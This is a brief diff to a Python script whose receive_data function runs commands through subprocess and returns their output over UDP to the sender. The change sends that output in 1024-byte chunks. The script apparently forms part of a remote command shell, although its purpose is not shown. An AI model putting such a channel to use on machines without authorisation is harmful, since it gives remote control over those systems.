@@ -20,12 +20,17 @@ def receive_data():
         except subprocess.CalledProcessError as e:
             result = e.output
         
-        print(result)
+        # print(result)
         result = result.decode() + "EOD"
         result = result.encode()
-        # Send command output to sender
-        bytes_sent = udp_socket.sendto(result, sender_ip_addr)
-        # print(bytes_sent)
+       
+        bytes_sent = 0
+        chunk_size = 1024
+        for i in range(0, len(result), chunk_size):
+            chunk = result[i:i+chunk_size]
+             # Send command output to sender
+            bytes_sent += udp_socket.sendto(chunk, sender_ip_addr)
+        
 
 if __name__ == "__main__":
     receive_data()
